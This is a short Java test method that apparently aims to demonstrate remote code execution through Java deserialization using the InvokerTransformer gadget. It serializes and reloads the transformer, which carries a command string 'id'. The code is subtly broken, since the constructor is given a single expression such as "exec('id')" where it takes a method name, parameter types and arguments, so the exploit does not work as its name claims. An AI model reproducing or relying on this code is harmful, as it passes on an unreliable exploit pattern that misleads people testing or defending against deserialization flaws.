public void testArbitraryRemoteCodeExecution() throws Exception {
    InvokerTransformer transformer = new InvokerTransformer("exec('id')");
    ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("payload.ser"));
    out.writeObject(transformer);
    out.close();

    ObjectInputStream in = new ObjectInputStream(new FileInputStream("payload.ser"));
    transformer = (InvokerTransformer) in.readObject();
    in.close();

    transformer.transform(null);
}